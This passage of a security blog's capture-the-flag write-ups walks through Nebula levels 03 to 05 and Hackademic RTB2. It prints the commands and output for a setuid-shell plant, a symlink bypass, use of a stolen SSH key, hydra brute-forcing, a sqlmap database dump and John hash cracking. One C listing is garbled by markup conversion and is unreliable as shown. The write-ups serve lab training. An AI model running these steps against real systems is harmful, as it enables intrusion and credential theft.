</span><span class='line'>&lt;p&gt;level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="c">#!/bin/bash</span>
</span><span class='line'>gcc /tmp/run.c -o /home/flag03/x
</span><span class='line'>chmod +s /home/flag03/x
</span><span class='line'><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; run.sh
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>chmod +x run.sh
</span></code></pre></td></tr></table></div></figure></p>

<p>After a little waiting, the suid binary is created:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>../x
</span><span class='line'>bash-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level04</h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span> <span class="p">[</span><span class="n">file</span> <span class="n">to</span> <span class="n">read</span><span class="p">]</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">token</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">You</span> <span class="n">may</span> <span class="n">not</span> <span class="n">access</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">open</span> <span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">read</span> <span class="n">fd</span> <span class="o">%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We cannot read the token file, but symlink technique is sufficient:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:~$ cd /home/flag04/
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04
</span><span class='line'>./flag04 [file to read]
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 token
</span><span class='line'>You may not access &lsquo;token&rsquo;
</span><span class='line'>level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/x
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/x
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2
</span><span class='line'>level04@nebula:/home/flag04$ su - flag04
</span><span class='line'>Password:
</span><span class='line'>flag04@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<h2>Level05</h2>

<p>In /home/flag05 we can find the backup file with ssh private key.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> tar xvzf .backup/backup-19072011.tgz  -C /tmp/
</span><span class='line'><span class="go">.ssh/</span>
</span><span class='line'><span class="go">.ssh/id_rsa.pub</span>
</span><span class='line'><span class="go">.ssh/id_rsa</span>
</span><span class='line'><span class="go">.ssh/authorized_keys&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level05@nebula:/home/flag05$ ssh -i /tmp/.ssh/id_rsa flag05@0</span>
</span><span class='line'><span class="gp">flag05@nebula:~$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB2]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/03/hackademic-rtb2/"/>
    <updated>2015-06-03T17:26:01+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/03/hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb2,18/">Hackademic: RTB2</a></p>

<p>We gained the IP address 192.168.80.150 for our testing target.</p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-05-01 07:55 CEST
</span><span class='line'>Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
</span><span class='line'>SYN Stealth Scan Timing: About 65.57% done; ETC: 07:55 (0:00:01 remaining)
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE    SERVICE
</span><span class='line'>80/tcp  open     http
</span><span class='line'>666/tcp filtered doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds</span></code></pre></td></tr></table></div></figure></p>

<p>It seems that the port 666 is filtered by the firewall. After running nmap scan
several times, we found the port to be open.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-05-01 07:55 CEST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00036s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE    SERVICE
</span><span class='line'>80/tcp  open     http
</span><span class='line'>666/tcp filtered doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# nmap 192.168.80.150 -p-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-05-01 07:56 CEST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00038s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>80/tcp  open  http
</span><span class='line'>666/tcp open  doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds</span></code></pre></td></tr></table></div></figure></p>

<p>Nikto output for port 80:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h &lt;a href="http://192.168.80.150/">http://192.168.80.150/&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          192.168.80.150&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    192.168.80.150&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-04-30 10:15:26 (GMT2)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.2.14 (Ubuntu)&lt;/li>
</span><span class='line'>&lt;li>Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>Uncommon header &lsquo;tcn&rsquo; found, with contents: list&lt;/li>
</span><span class='line'>&lt;li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.&lt;/a> The following alternatives for &lsquo;index&rsquo; were found: index.php&lt;/li>
</span><span class='line'>&lt;li>Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
</span><span class='line'>&lt;li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /icons/README, inode: 413560, size: 5108, mtime: Tue Aug 28 12:48:10 2007&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>/phpmyadmin/: phpMyAdmin directory found&lt;/li>
</span><span class='line'>&lt;li>7495 requests: 0 error(s) and 15 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-04-30 10:15:41 (GMT2) (15 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>The web page suggests to look for SQLi, unfortunately we were not able to find
any here.</p>

<p>Trying hydra for bruteforce or joomscan (port 666) reveals us nothing new too.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# hydra 192.168.80.150 http-form-post &ldquo;/check.php:username=^USER^&amp;password=^PASS^&amp;Submit=Check%21:wrong credentials&rdquo; -L /usr/share/ncrack/default.usr -P /usr/share/ncrack/default.pwd  -t 10 -w 30  -u -f
</span><span class='line'>root@kali32:/tmp# joomscan -u &lt;a href="http://192.168.80.150:666/index.php">http://192.168.80.150:666/index.php&lt;/a> -oh</span></code></pre></td></tr></table></div></figure></p>

<p>After a little time, we found SQLi in Joomla and dumped the whole database:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sqlmap -u &ldquo;&lt;a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test&lt;/a>&rdquo;  -p letter &ndash;dump-all</span></code></pre></td></tr></table></div></figure></p>

<p>Trying to crack MySQL hashes was without success.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv
</span><span class='line'>Host,User,Password,ssl_type,Drop_priv,File_priv,Grant_priv,Super_priv,Alter_priv,ssl_cipher,Index_priv,Event_priv,Create_priv,max_updates,Reload_priv,Delete_priv,Insert_priv,x509_issuer,Select_priv,Update_priv,Execute_priv,Show_db_priv,x509_subject,Process_priv,Trigger_priv,Shutdown_priv,max_questions,Show_view_priv,References_priv,max_connections,Repl_slave_priv,Repl_client_priv,Create_user_priv,Create_view_priv,Lock_tables_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv
</span><span class='line'>localhost,root,&lt;em>5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>HackademicRTB2,root,&lt;/em>5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>127.0.0.1,root,&lt;em>5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>localhost,debian-sys-maint,&lt;/em>F36E6519B0B1D62AA2D5346EFAD66D1CAF248996,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>localhost,phpmyadmin,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,N,N,N,N,N,&lt;blank>,N,N,N,0,N,N,N,&lt;blank>,N,N,N,N,&lt;blank>,N,N,N,0,N,N,0,N,N,N,N,N,N,N,0,N&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed &rsquo;s#,#:#&lsquo; > hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# john &ndash;format=mysql-sha1 hashes.csv</span></code></pre></td></tr></table></div></figure></p>

<p>We parse the Joomla usernames and passwords and crack using John:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv
</span><span class='line'>id,gid,name,email,block,params,username,usertype,password,sendEmail,activation,registerDate,lastvisitDate
</span><span class='line'>62,25,Administrator,admin@hackademirtb2.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,Administrator,Super Administrator,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,1,&lt;blank>,2011-01-17 19:31:21,2011-01-22 16:38:49
</span><span class='line'>63,18,John Smith,JSmith@hackademicrtb.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,JSmith,Registered,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,0,&lt;blank>,2011-01-22 10:17:30,2011-01-25 15:02:13
</span><span class='line'>64,18,Billy Tallor,BTallor@hackademic.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,BTallor,Registered,abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy,0,&lt;blank>,2011-01-22 10:18:06,0000-00-00 00:00:00&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e &rsquo;s/:/\$/&lsquo; -e &rsquo;s/,/:/&rsquo;&lt;br/>
</span><span class='line'>username:password
</span><span class='line'>Administrator:08f43b7f40fb0d56f6a8fb0271ec4710$n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
</span><span class='line'>JSmith:992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF
</span><span class='line'>BTallor:abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:/usr/share/dirb# john &ndash;list=subformats
</span><span class='line'>Format = dynamic_0   type = dynamic_0: md5($p) (raw-md5)
</span><span class='line'>Format = dynamic_1   type = dynamic_1: md5($p.$s) (joomla)
</span><span class='line'>Format = dynamic_2   type = dynamic_2: md5(md5($p)) (e107)
</span><span class='line'>&hellip;&lt;/p>
</span><span class='line'>
